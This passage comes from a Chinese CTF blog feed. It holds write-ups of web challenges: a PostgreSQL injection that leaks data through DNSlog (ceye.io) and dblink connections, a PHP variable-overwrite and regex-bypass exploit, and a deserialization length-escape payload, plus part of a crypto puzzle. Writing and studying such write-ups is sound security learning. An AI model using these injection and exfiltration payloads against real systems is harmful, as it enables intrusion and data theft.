&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;HTTP_USER_AGENT¸­--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>好像没啥，根据 <code>hint：不是所有sql都叫PostgreSQL；flag在web目录下的某个文件里。</code> 确定，关键文件肯定在这里，于是继续尝试，读到了<code>.hatccess</code>，包含一下，再读一下</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>可疑文件<code>pushF1n4AnK</code>，读一下</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>至此题目结束了</p><p>最后说一下注入点的问题</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>对于DNSlog，注入点在host，即<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>，上面已解释过</p><h4 id="数据库外联"><a href="#数据库外联" class="headerlink" title="数据库外联"></a>数据库外联</h4><p>注入点在明文传输的部分，即<code>... user=&#39;|| (query) ||&#39;...</code>和<code>... dbname=&#39;||(query) &#39;</code>最后不需要<code>|</code>连接符，因为没有东西加了会报错</p><p>举例，例如在获取所有大对象oid时，在<code>user</code>处注，如图所示</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>即<code>user</code>和<code>dbname</code>处都是明文传输的都可以注，而password不行</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬的教导，感谢 @egg 师傅的指导，以及和 @R1chm0nd 师傅赛后讨论指正payload中<code>user=&#39; || (query) || &#39;</code>的<code>|</code>或符合其实是连接符，学习了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> la佬博客，希望能和师傅一样强，能和师傅换友链</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (写udf的，没用上2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF2021</title>
      <link href="article/djbctf2021/"/>
      <url>article/djbctf2021/</url>
      
        <content type="html"><![CDATA[<p>2021第一场比赛</p><p>昵称：别答了别答了再答人傻了</p><span id="more"></span><p>DJBctf，孩子太菜了呜呜呜</p><p>做了两道web，签到题有非预期(汗)，分析下预期和非预期解法，加上些个人的理解</p><p>本Web狗何德何能，尝试做了一道密码学…赛后才终于出了。</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Almost there."</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Input correct parameters"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Congratulations!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>有一个类，可能是反序列化，但看到最后<code>call_user_func</code>，类里面还有个static函数，应该是直接调用了。</p><p>看逻辑，<code>php://input</code>，变量<code>str</code>从POST原始流读取数据，过滤后变量覆盖。然后传入<code>shaw_root</code>，满足条件会给hint，最后<code>$ans===$SecretNumber</code>即可调用函数了。</p><hr><p>首先传<code>shaw_root</code>，第一个点在过滤了<code>_</code>，根据PHP特性，<code>空格</code>，<code>.</code>传递最后都会转变为<code>-</code></p><p>如图所示，此为web3的调试，与本题此考点一致</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984" loading="lazy"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979" loading="lazy"><p>传入空格，<code>.</code>都变成了<code>_</code></p><p>接下来就是绕正则了，去regex101调了半天(没学正则的懒狗—–&gt;我)，调了一个payload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056" loading="lazy"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>传入得</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959" loading="lazy"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>写脚本爆破,脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/23 16:58@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>爆破得<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123" loading="lazy"><p>传入成功</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356" loading="lazy"><p>表明成功了，最后一步调用函数，根据PHP文档，类static函数可以直接用<code>class::static function</code>调用，详情见<a href="https://www.php.net/manual/zh/function.call-user-func.php">官方文档</a></p><p>最终payload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201" loading="lazy"><p>这里要注意，如果用HackBar发包的话要换模式</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793" loading="lazy"><p>因为转义是阻挡你前进步伐的一大元凶</p><h4 id="题目思考"><a href="#题目思考" class="headerlink" title="题目思考"></a>题目思考</h4><p>因为变量覆盖，直接把<code>SecretNumber</code>覆盖就行了，本题在<code>str</code>处有个过滤<code>e</code>，所以不行</p><p><code>php://input</code>读入原始流数据，所以取反异或转义之类的方法都是不行的</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Web签到题(大概)，源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token string single-quoted-string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>标准反序列化长度逃逸，可惜非预期了</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>看<code>spaceman</code>类，两个变量由魔术方法<code>__construct</code>赋值，<code>filter</code>函数替换字符串，基本上就确定本题是反序列化长度逃逸了。</p><p>同样，<code>php://input</code>读取原始流数据变量覆盖，绕过方法同web1，构造反序列化</p><p><code>str_replace</code>将<code>ctfshowup</code>替换为<code>ctfshow</code>，也就是说原来9个字符变成了7个字符，有两个字符逃逸了。</p><p>我们的核心目标是将<code>password</code>覆盖为<code>ctfshowvip</code>，所以最后部分的序列化字符串应为<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>，一共35个字符。</p><p>所以它原始生成的部分应该被覆盖的为<code>&quot;;s:8:&quot;password&quot;;s:35:</code>即22个字符，所以<code>username</code>应该填入11个<code>ctfshowup</code>来覆盖它</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token string double-quoted-string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>最终payload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>记得空格绕<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844" loading="lazy"><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>由于变量覆盖，直接覆盖<code>pass_word</code>即可</p><p>payload：<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341" loading="lazy"><h4 id="题目思考-1"><a href="#题目思考-1" class="headerlink" title="题目思考"></a>题目思考</h4><p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong> </p><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>经典的反序列化长度逃逸的题目了</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="大佬们帮我看看我这个Python脚本为什么运行不了啊"><a href="#大佬们帮我看看我这个Python脚本为什么运行不了啊" class="headerlink" title="大佬们帮我看看我这个Python脚本为什么运行不了啊"></a>大佬们帮我看看我这个Python脚本为什么运行不了啊</h3><p>题目描述</p><pre class="language-none"><code class="language-none">菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py菜鸡 9:37:02key1: Do you want a DaJiBei?菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">为什么运行结果里好好的3，也要写成大小写混乱的样子？</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">如果某个方向已经找不到更多的线索，不妨回头看看来时的道路</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？ 为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png" loading="lazy"><p>最终提示hint5直接点明摩斯密码</p><p>题目原件</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>《关于我的老师看到直接气死过去怎么办》</p><p>根据题目描述，把<code>key1</code>替换为<code>Do you want a 